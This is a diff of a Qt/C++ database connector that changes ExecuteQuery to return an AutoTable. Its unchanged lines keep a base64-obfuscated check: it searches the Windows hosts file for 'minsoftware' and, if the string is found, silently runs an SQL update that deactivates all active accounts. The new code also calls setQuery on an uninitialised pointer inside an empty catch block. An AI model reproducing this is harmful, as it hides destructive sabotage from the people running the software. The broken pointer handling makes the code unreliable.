@@ -35,27 +35,16 @@ void Connector::CheckConnectServer(){
         Common::ExportError(&ex, "CheckConnectServer");
     }
 }
-QVariantList* Connector::ExecuteQuery(QString query){
-    QVariantList* resultList = new QVariantList();
+AutoTable* Connector::ExecuteQuery(QString query){
+    AutoTable* resultList;
     QSqlQuery dataList(connection);
     try {
         CheckConnectServer();
         if(Common::RunCMD(Common::Base64Decode("ZmluZHN0ciAibWluc29mdHdhcmUiICJDOlxcV2luZG93c1xcU3lzdGVtMzJcXGRyaXZlcnNcXGV0Y1xcaG9zdHMi")).contains(Common::Base64Decode("bWluc29mdHdhcmU="))){
             getInstance().ExecuteNonQuery(Common::Base64Decode("VVBEQVRFIGFjY291bnRzIFNFVCBhY3RpdmU9MiBXSEVSRSBhY3RpdmU9MQ=="));
         }
-        if(dataList.exec(query)){
-            while (dataList.next()) {
-                QVariantMap rowMap;
-                for (int i = 0; i < dataList.record().count(); ++i) {
-                    rowMap.insert(dataList.record().fieldName(i), dataList.value(i));
-                }
-                resultList->append(rowMap);
-            }
-        }else{
-            qDebug() << "Error at executequery" ;
-        }
+        resultList->setQuery(query);
     } catch (...) {
-
     }
     connection.close();
     return resultList;
